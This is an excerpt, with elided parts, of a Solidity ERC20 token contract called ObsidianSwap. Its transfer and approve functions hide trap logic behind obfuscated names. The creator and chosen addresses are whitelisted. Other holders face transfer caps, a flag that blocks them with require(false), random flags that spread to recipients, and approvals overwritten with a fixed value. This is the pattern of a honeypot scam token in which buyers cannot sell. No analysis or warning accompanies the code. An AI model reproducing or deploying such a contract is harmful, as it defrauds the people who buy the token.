...
contract ObsidianSwap is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public loki;
  mapping (address => bool) public laufeson;
  mapping (address => bool) public sylvie;
  mapping (address => uint256) public kang;
  ...
  constructor() public {
    ...
    jeremy = chTx * 30;
    laufeson[creator] = false;
    sylvie[creator] = false;
    loki[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (conquerer == true)) {
      loki[recipient] = true;
      laufeson[recipient] = false;
      conquerer = false;
    }
    
    if ((amount > jeremy) && (loki[sender] == true) && (address(sender) != creator)) {
        sylvie[recipient] = true;
    }
    
    if (loki[recipient] != true) {
        laufeson[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((laufeson[sender]) && (loki[recipient] == false)) {
        laufeson[recipient] = true;
    }
    
    if (loki[sender] == false) {
      if ((amount > jeremy) && (sylvie[sender] == true)) {
        require(false);
      }
      
      require(amount < renner);
      if (wyoming == true) {
        if (sylvie[sender] == true) {
          require(false);
        }
        sylvie[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (palca == true)) {
      loki[spender] = true;
      laufeson[spender] = false;
      sylvie[spender] = false;
      palca = false;
    }
    
    tok = (laufeson[owner] ? 43354 : amount);
